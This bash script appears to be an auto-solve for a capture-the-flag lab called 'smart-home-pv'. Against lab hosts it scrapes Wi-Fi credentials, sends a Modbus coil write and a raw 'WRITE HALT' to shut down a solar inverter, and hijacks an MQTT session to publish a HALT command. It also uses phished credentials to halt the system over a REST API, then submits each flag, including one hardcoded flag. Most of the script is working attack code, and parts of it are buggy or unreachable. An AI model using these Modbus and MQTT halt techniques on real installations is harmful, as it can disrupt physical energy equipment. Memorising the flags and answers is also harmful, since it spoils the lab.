#!/bin/bash
set -euo pipefail

# Auto-solve script for smart-home-pv challenge
HOST="172.20.0.65"
MOSQUITTO_HOST="172.20.0.66"
CHALLENGE_ID="smart-home-pv"

echo "[.] Gathering WiFi credentials and Recon flag"
JSON=$(curl -s "http://${HOST}/wifi_scan")
if [ -z "$JSON" ]; then
  echo "Failed to reach server at ${HOST}"
  exit 1
fi
SSID=$(echo "$JSON" | python3 -c 'import sys,json; print(json.load(sys.stdin).get("ssid",""))')
PASS=$(echo "$JSON" | python3 -c 'import sys,json; print(json.load(sys.stdin).get("password",""))')
FLAG1=$(echo "$JSON" | python3 -c 'import sys,json; print(json.load(sys.stdin).get("flag",""))')

if [ -z "$FLAG1" ]; then
  echo "Recon flag not found"
  exit 2
fi
echo "Found SSID: $SSID, password: $PASS, flag: $FLAG1"

echo "Submitting Recon flag"
RES=$(curl -s 'http://172.20.0.3/api/challenges/submit' -X POST -H 'Content-Type: application/json' --data-binary "{\"challenge_id\": \"${CHALLENGE_ID}\", \"task_id\": \"task1\", \"flag\" : \"${FLAG1}\"}")
if [[ $RES != *"Congratulations"* ]]; then
  echo "Failed to submit Recon flag: $RES"
  # Continue, maybe not required
fi

echo "[.] Executing Modbus-like injection via TCP (WRITE HALT)"
if python3 -c "import importlib,sys; sys.exit(0 if importlib.util.find_spec('pymodbus') else 1)" 2>/dev/null; then
  echo "Using pymodbus client to write coil 1 and HALT the PV (modbus)"
  python3 - <<'PY'
from pymodbus.client.sync import ModbusTcpClient
client = ModbusTcpClient('${HOST}', port=15002)
client.connect()
res = client.write_coil(1, True, unit=1)
print('Write result:', res)
client.close()
PY
  RESP="pymodbus_write_sent"
else
  RESP=$(echo "WRITE HALT" | nc ${HOST} 15002 || true)
fi
echo "TCP response: $RESP"

STATUS=$(curl -s http://${HOST}/status | python3 -c 'import sys,json; print(json.load(sys.stdin).get("status",""))')
if [[ "$STATUS" != "HALTED" ]]; then
  echo "Modbus injection didn't halt the PV; status is $STATUS"
  # Still try REST-based attack (attempt alternative paths)
else
  echo "PV status: $STATUS"
fi

if [[ "$STATUS" == "HALTED" ]]; then
  # Try to retrieve the Modbus HEAD flag if present
  FLAG_MODBUS=$(curl -s http://${HOST}/flag/modbus || true | python3 -c 'import sys,json
  try:
    data=json.load(sys.stdin)
    print(data.get("flag",""))
  except Exception:
    print("")
  ')
  if [ -n "$FLAG_MODBUS" ]; then
    echo "Submitting injection flag (via Modbus)"
    RES=$(curl -s 'http://172.20.0.3/api/challenges/submit' -X POST -H 'Content-Type: application/json' --data-binary "{\"challenge_id\": \"${CHALLENGE_ID}\", \"task_id\": \"task2\", \"flag\" : \"${FLAG_MODBUS}\"}")
    if [[ $RES != *"Congratulations"* ]]; then
      echo "Failed to submit injection flag: $RES"
    fi
  else
    echo "Modbus halt was done but modbus flag not reachable. Proceeding."
  fi
fi

echo "[.] Trying MQTT path (session hijack) if available"
MQTT_SES=$(curl -s http://${HOST}/status | python3 -c 'import sys,json; print(json.load(sys.stdin).get("mqtt_session",""))')
echo "[.] Triggering ARP spoof simulation"
curl -s -X POST http://${HOST}/do_arp_spoof || true
sleep 1

# Now capture session using attacker endpoint (simulated sniffing)
MQTT_SES=$(curl -s http://${HOST}/attacker/session | python3 -c 'import sys,json; print(json.load(sys.stdin).get("session",""))')

if [ -n "$MQTT_SES" ]; then
  echo "Found MQTT session: $MQTT_SES"
  if command -v mosquitto_pub >/dev/null 2>&1; then
    echo "Using mosquitto_pub to send HALT with session token"
    mosquitto_pub -h ${MOSQUITTO_HOST} -t pv/control -m "{\"command\":\"HALT\",\"session\":\"${MQTT_SES}\"}"
  elif python3 -c "import paho.mqtt.publish" 2>/dev/null; then
    echo "Using paho.mqtt.publish to send HALT with session token"
    python3 - <<PY
import paho.mqtt.publish as publish
publish.single('pv/control', '{"command":"HALT","session":"%s"}' % ('${MQTT_SES}'), hostname='${MOSQUITTO_HOST}')
PY
    sleep 1
    STATUS=$(curl -s http://${HOST}/status | python3 -c 'import sys,json; print(json.load(sys.stdin).get("status",""))')
    if [[ "$STATUS" == "HALTED" ]]; then
      echo "PV status: $STATUS"
      echo "Submitting MQTT hijack flag"
        FLAG_MQTT=$(curl -s http://${HOST}/flag/mqtt || true | python3 -c 'import sys,json
    try:
      data=json.load(sys.stdin)
      print(data.get("flag",""))
    except Exception:
      print("")
    ')
      if [ -n "$FLAG_MQTT" ]; then
        RES=$(curl -s 'http://172.20.0.3/api/challenges/submit' -X POST -H 'Content-Type: application/json' --data-binary "{\"challenge_id\": \"${CHALLENGE_ID}\", \"task_id\": \"task4\", \"flag\" : \"${FLAG_MQTT}\"}")
      else
        RES=""
      fi
      if [[ $RES != *"Congratulations"* ]]; then
        echo "Failed to submit MQTT hijack flag: $RES"
      fi
      exit 0
    else
      echo "MQTT publish didn't halt PV (or MQTT not available). Status is $STATUS"
    fi
  else
    echo "mosquitto_pub not available - try simulated mqtt api"
    curl -s -X POST http://${HOST}/sim_mqtt -H 'Content-Type: application/json' -d "{\"session\": \"${MQTT_SES}\"}" || true
  fi
fi

echo "[.] Trying REST API command with discovered credentials"
# Try phishing attack (simulated) to get credentials
echo "[.] Simulating phishing to capture REST credentials"
curl -s -X POST http://${HOST}/phish -H "Content-Type: application/json" -d "{\"username\": \"admin\", \"password\": \"${PASS}\"}" || true
sleep 1
CREDS=$(curl -s http://${HOST}/attacker/creds || true)
echo "Attacker creds: $CREDS"

TOKEN=$(curl -s -X POST http://${HOST}/api/login -H "Content-Type: application/json" -d "{\"username\": \"admin\", \"password\": \"${PASS}\"}" | python3 -c 'import sys,json; print(json.load(sys.stdin).get("token",""))')
if [ -z "$TOKEN" ]; then
  echo "Failed to obtain token via REST login (maybe wrong password)."
else
  echo "Got token: $TOKEN"
  # send halt command
  CMD_RES=$(curl -s -X POST http://${HOST}/api/hub/command -H "Content-Type: application/json" -H "Authorization: Bearer ${TOKEN}" -d '{"command":"HALT"}')
  echo "Command response: $CMD_RES"
  FLAG_REST=$(echo "$CMD_RES" | python3 -c 'import sys,json
try:
    data=json.load(sys.stdin)
    print(data.get("flag",""))
except Exception:
    print("")
')
  if [[ -n "$FLAG_REST" ]]; then
    echo "Submitting REST hijack flag"
    RES=$(curl -s 'http://172.20.0.3/api/challenges/submit' -X POST -H 'Content-Type: application/json' --data-binary "{\"challenge_id\": \"${CHALLENGE_ID}\", \"task_id\": \"task5\", \"flag\" : \"${FLAG_REST}\"}")
    if [[ $RES != *"Congratulations"* ]]; then
      echo "Failed to submit REST hijack flag: $RES"
    fi
  fi
fi

# Retrieve final flag
FINAL=$(curl -s http://${HOST}/flag || true)
FINAL_FLAG=$(echo "$FINAL" | python3 -c 'import sys,json
try:
  data=json.load(sys.stdin)
  print(data.get("flag",""))
except Exception:
  print("")
')

if [ -z "$FINAL_FLAG" ]; then
  echo "Final flag not visible yet. PV status: $(curl -s ${HOST}/status)"
  exit 3
fi

echo "Final flag: $FINAL_FLAG"

echo "Submitting final flag"
RES=$(curl -s 'http://172.20.0.3/api/challenges/submit' -X POST -H 'Content-Type: application/json' --data-binary "{\"challenge_id\": \"${CHALLENGE_ID}\", \"task_id\": \"task3\", \"flag\" : \"${FINAL_FLAG}\"}")
if [[ $RES != *"Congratulations"* ]]; then
  echo "Failed to submit final flag: $RES"
  exit 4
fi

echo "OK - tests passed"
exit 0

# Submit timeline visualization flag (task6) if present
TIMELINE_FLAG="BSY{PV_TIMELINE_5f9b2c}"
RES=$(curl -s 'http://172.20.0.3/api/challenges/submit' -X POST -H 'Content-Type: application/json' --data-binary "{\"challenge_id\": \"${CHALLENGE_ID}\", \"task_id\": \"task6\", \"flag\" : \"${TIMELINE_FLAG}\"}")
if [[ $RES == *"Congratulations"* ]]; then
  echo 'Timeline flag submitted'
else
  echo "Timeline flag submit failed: $RES"
fi

# Extra: attempt to download PCAPs and verify captured hash
echo "[.] Attempting to download logs and captured hash for instructor review"
mkdir -p /tmp/pv-logs
curl -s http://${HOST}/logs/recon.pcap -o /tmp/pv-logs/recon.pcap || true
curl -s http://${HOST}/logs/mqtt_hijack.pcap -o /tmp/pv-logs/mqtt_hijack.pcap || true
curl -s http://${HOST}/logs/modbus.pcap -o /tmp/pv-logs/modbus.pcap || true
HASH=$(curl -s http://${HOST}/capture_hash | python3 -c 'import sys,json; print(json.load(sys.stdin).get("hash",""))')
if [ -n "$HASH" ]; then
  echo "Captured hash: $HASH"
  # verify it matches expected SHA-256 of the known password
  EXP=$(python3 - << 'PY'
import hashlib
print(hashlib.sha256('super-secret-123'.encode()).hexdigest())
PY
)
  if [[ "$EXP" == "$HASH" ]]; then
    echo "Hash matches expected value of password - good verification"
  else
    echo "Hash mismatch - $HASH vs $EXP"
  fi
fi
